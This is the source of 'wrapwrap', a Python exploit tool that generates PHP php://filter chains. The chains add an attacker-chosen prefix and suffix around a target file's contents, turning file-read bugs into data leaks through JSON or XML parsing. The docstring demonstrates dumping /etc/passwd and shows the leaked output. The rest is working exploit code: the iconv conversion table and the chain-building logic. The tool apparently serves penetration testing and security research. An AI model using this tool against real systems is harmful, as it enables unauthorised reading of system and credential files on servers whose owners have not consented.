#!/usr/bin/env python3
"""
# DESCRIPTION

Generates a php://filter wrapper that adds a prefix and a suffix to the contents of a file.
    
For instance, if /tmp/test.txt contains ABCDEF, the tool can generate a filter chain that returns:

    <arbitrary-prefix>ABCDEF<arbitrary-suffix>

It is useful in cases such as:

    $data = file_get_contents($controlled);
    $data = json_decode($data);
    echo $data->message;

or:

    $xml = file_get_contents($controlled);
    $movies = new SimpleXMLElement($xml);
    echo $movies->movie[0]->plot;
    
# EXAMPLE

To solve the first example:

    $ ./wrapwrap.py /etc/passwd '{"message":"' '"}' 200
    [*] Dumping 207 bytes from /etc/passwd.
    [+] Wrote filter chain to chain.txt (size=152464).
    $ php -r 'echo file_get_contents(file_get_contents("chain.txt"));'
    {"message":"root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:2:2:bin:/bin:/usr/sbin/nologin=0Asys:x:3:3:sys:/dev:/usr/sbin/nologin=0Async:x:4:65534:sync:/bin:/bin/sync=0Agames:x:"}

To solve the second example:

    $ ./wrapwrap.py /etc/passwd '<movies><movie><plot>' '</plot></movie></movies>' 100
    [*] Dumping 108 bytes from /etc/passwd.
    [+] Wrote filter chain to chain.txt (size=88781).
    $ php -r 'echo file_get_contents(file_get_contents("chain.txt"));'
    <root><test>root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:2:2:bin:/bin:/usr/</test></root>

# REQUIREMENTS

Requires ten (https://github.com/cfreal/ten).

# IMPROVEMENTS

- Let user pick encoding method for the original payload: QPE, B64, RAW
- Add option to gzip/bzip contents
- Add start parameter that decides how many bytes to discard.
- Improve alignment requirements to make nb_bytes not have to be divisible by 9
- Add the `test` parameter, that tests the payload

ACKNOWLEDGEMENT

Built by cfreal.

This is based on the work of many individuals, the most recent being
https://github.com/synacktiv/php_filter_chain_generator by remsio.
"""

from ten import *
from dataclasses import dataclass


@entry
@arg("path", "Path to the file")
@arg("nb_bytes", "Number of bytes to dump. It will be aligned with 9")
@arg("prefix", "A string to write before the contents of the file")
@arg("suffix", "A string to write after the contents of the file")
@arg("output", "File to write the payload to. Defaults to chain.txt")
@arg("padding_character", "Character to pad the prefix and suffix. Defaults to `M`.")
@arg("from_file", "If set, prefix and suffix indicate files to load their value from, instead of the value itself")
@dataclass
class WrapWrap:
    """Generates a php://filter wrapper that adds a prefix and a suffix to the contents of a file.

    Example:

        $ ./wrapwrap.py /etc/passwd '<root><test>' '</test></root>' 100
        [*] Dumping 108 bytes from /etc/passwd.
        [+] Wrote filter chain to chain.txt (size=88781).
        $ php -r 'echo file_get_contents(file_get_contents("chain.txt"));'
        <root><test>root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:2:2:bin:/bin:/usr/</test></root>
    """

    path: str
    prefix: str
    suffix: str
    nb_bytes: int
    output: str = "chain.txt"
    padding_character: str = "M"
    from_file: bool = False

    def run(self) -> None:
        if self.from_file:
            self.prefix = read_bytes(self.prefix)
            self.suffix = read_bytes(self.suffix)
        else:
            self.prefix = self.prefix.encode()
            self.suffix = self.suffix.encode()
        
        self.filters = []
        
        if self.suffix:
            self.compute_nb_chunks()
            self.prelude()
            self.add_suffix()
            self.pad_suffix()
            self.add_prefix()
            self.postlude()
        else:
            self.add_simple_prefix()

        filters = "|".join(self.filters)
        payload = f"php://filter/{filters}/resource={self.path}"
        Path(self.output).write(payload)
        msg_success(f"Wrote filter chain to [b]{self.output}[/] (size={len(payload)}).")
        
    def add_simple_prefix(self):
        """Just adds a prefix.
        """
        self / B64E / REMOVE_EQUAL
        
        prefix = self.align_right(self.prefix, 3)
        prefix = self.b64e(prefix)
        
        for char in reversed(prefix):
            self.push_char_safely(char)
        
        self / B64D

    def compute_nb_chunks(self) -> None:
        real_stop = self.align_value(self.nb_bytes, 9)
        self.nb_chunks = int(real_stop / 9 * 4)
        msg_info(f"Dumping [i]{real_stop}[/] bytes from [b]{self.path}[/].")

    def __truediv__(self, filters: str) -> None:
        self.filters.append(filters)
        return self

    def push_char(self, c: bytes) -> None:
        if isinstance(c, int):
            c = bytes((c,))
        return self / self.conversions[c] / B64D / B64E

    def push_char_safely(self, c: str) -> None:
        self.push_char(c) / REMOVE_EQUAL

    def pad(self) -> None:
        """Pads the content of the file with some garbage to make sure we don't trim
        part of the file when aligning.
        """
        TIMES = 3
        self / B64E

        for _ in range(TIMES):
            self / B64E
            self / REMOVE_EQUAL

        for _ in range(TIMES):
            self / B64D
            self / REMOVE_EQUAL

        self / B64D

    def align(self) -> None:
        """Makes the B64 payload have a size divisible by 3.
        The second B64 needs to be 3-aligned because the third needs to be 4-aligned.
        """
        self / B64E / QPE / REMOVE_EQUAL
        self.push_char(b"A")
        self / QPE / REMOVE_EQUAL
        self.push_char(b"A")
        self / QPE / REMOVE_EQUAL
        self.push_char_safely(b"A")
        self.push_char_safely(b"A")
        self / B64D

    def escape(self) -> None:
        """Escapes the payload to make it safe for display."""
        # TODO make configurable: B64 is better in some cases, if the file is binary
        self / QPE

    def prelude(self) -> None:
        """Adds trailing garbage, escapes the content, and properly aligns it."""
        self.pad()
        self.escape()
        self / B64E / B64E
        self.align()
        self / "convert.iconv.437.UCS-4le"

    def add3_swap(self, triplet: bytes):
        assert len(triplet) == 3, f"add3 called with: {triplet}"
        b64 = self.b64e(triplet)
        self / B64E
        self.push_char(b64[3])
        self.push_char(b64[2])
        self.push_char(b64[1])
        self.push_char(b64[0])
        self / B64D
        self / SWAP4

    def b64e(self, value: str, strip: bool = False) -> bytes:
        value = tf.base64.encode(value)
        if strip:
            while value.endswith("="):
                value = value.removesuffix("=")
        return value.encode()

    def add_suffix(self) -> None:
        """Adds a suffix to the string, along with the <LF>0<LF> that marks the end of
        chunked data.
        """
        self.add3_swap("\n0\n")
        suffix_b64 = self.b64e(self.suffix)
        reverse = False

        for chunk in reversed(list(niter(suffix_b64, 2))):
            chunk = self.b64e(chunk, strip=True)
            chunk = self.set_lsbs(chunk)
            if reverse:
                chunk = chunk[::-1]
            self.add3_swap(chunk)
            reverse = not reverse

    def pad_suffix(self) -> None:
        """Moves the suffix up the string."""
        for _ in range(self.nb_chunks * 4 + 2):
            # This is not a random string: it minimizes the size of the payload
            self.add3_swap("\x08\x29\x02")

    def add_prefix(self) -> None:
        self / B64E

        prefix = self.align_right(self.prefix, 3)
        prefix = self.b64e(prefix)
        prefix = self.align_right(prefix, 3 * 3, "\x00")
        prefix = self.b64e(prefix)
        size = int(
            len(self.b64e(self.suffix)) / 2 * 4
            + self.nb_chunks * 4 * 4
            + 2
            + 7
            + len(prefix)
        )
        chunk_header = self.align_left(f"{size:x}\n".encode(), 3, b"0")
        b64 = self.b64e(chunk_header + prefix)
        for char in reversed(b64):
            self.push_char_safely(char)

    def postlude(self) -> None:
        self / B64D / "dechunk" / B64D / B64D

    def set_lsbs(self, chunk: str) -> str:
        """Sets the two LS bits of the given chunk, so that the caracter that comes
        after is not ASCII, and thus not a valid B64 char. A double decode would
        therefore "remove" that char.
        """
        char = chunk[2]
        alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        index = alphabet.find(char)
        return chunk[:2] + alphabet[index + 3: index + 3 + 1]

    def align_right(self, input_str: str, n: int, p: str = None) -> bytes:
        """Aligns the input string to the right to make its length divisible by n, using
        the specified pad character.
        """
        p = p or self.padding_character
        p = p.encode()
        padding_size = (n - len(input_str) % n) % n
        aligned_str = input_str.ljust(len(input_str) + padding_size, p)

        return aligned_str

    def align_left(self, input_str: str, n: int, p: str = None) -> bytes:
        """Aligns the input string to the left to make its length divisible by n, using
        the specified pad character.
        """
        p = p or self.padding_character
        aligned_str = input_str.rjust(self.align_value(len(input_str), n), p)

        return aligned_str

    @staticmethod
    def align_value(value: int, div: int) -> int:
        return value + (div - value % div) % div

    conversions = {
        b"0": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2",
        b"1": "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4",
        b"2": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921",
        b"3": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE",
        b"4": "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE",
        b"5": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2",
        b"6": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2",
        b"7": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4",
        b"8": "convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2",
        b"9": "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
        b"A": "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
        b"a": "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE",
        b"B": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
        b"b": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE",
        b"C": "convert.iconv.UTF8.CSISO2022KR",
        b"c": "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
        b"D": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213",
        b"d": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5",
        b"E": "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
        b"e": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937",
        b"F": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB",
        b"f": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
        b"g": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8",
        b"G": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
        b"H": "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
        b"h": "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE",
        b"I": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213",
        b"i": "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000",
        b"J": "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
        b"j": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16",
        b"K": "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
        b"k": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
        b"L": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC",
        b"l": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE",
        b"M": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T",
        b"m": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949",
        b"N": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
        b"n": "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61",
        b"O": "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775",
        b"o": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE",
        b"P": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB",
        b"p": "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4",
        b"q": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2",
        b"Q": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2",
        b"R": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4",
        b"r": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101",
        b"S": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS",
        b"s": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
        b"T": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103",
        b"t": "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
        b"U": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
        b"u": "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61",
        b"V": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB",
        b"v": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2",
        b"W": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936",
        b"w": "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
        b"X": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
        b"x": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
        b"Y": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361",
        b"y": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
        b"Z": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16",
        b"z": "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937",
        b"/": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4",
        b"+": "convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157",
    }


# Constants

B64D = "convert.base64-decode"
B64E = "convert.base64-encode"
QPE = "convert.quoted-printable-encode"
REMOVE_EQUAL = "convert.iconv.855.UTF7"
SWAP4 = "convert.iconv.UCS-4.UCS-4LE"

WrapWrap()
